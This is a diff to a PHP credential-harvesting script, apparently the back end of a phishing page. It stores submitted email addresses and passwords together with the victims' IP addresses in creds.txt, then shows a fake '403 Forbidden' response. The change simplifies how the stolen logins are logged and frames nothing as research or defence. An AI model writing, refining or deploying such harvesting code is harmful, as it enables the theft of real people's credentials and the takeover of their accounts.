@@ -2,9 +2,9 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = $_POST['email'] ?? 'N/A';
     $password = $_POST['password'] ?? 'N/A';
-    $real_ip = $_POST['real_ip'] ?? null;
+    $real_ip = $_POST['real_ip'] ?? 'NOT_SET';
 
-    // Best-effort server-side IP detection
+    // Server-side IP
     $ip = $_SERVER['REMOTE_ADDR'];
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         $ip = $_SERVER['HTTP_CLIENT_IP'];
@@ -14,12 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     $time = date("Y-m-d H:i:s");
-
-    $logEntry = "[$time] IP: $ip";
-    if ($real_ip && $real_ip !== $ip) {
-        $logEntry .= " | RealIP: $real_ip";
-    }
-    $logEntry .= " | Email: $email | Password: $password\n";
+    $logEntry = "[$time] IP: $ip | RealIP: $real_ip | Email: $email | Password: $password\n";
 
     file_put_contents("creds.txt", $logEntry, FILE_APPEND | LOCK_EX);
 
@@ -30,4 +25,3 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo "403 Forbidden";
     exit();
 }
-?>
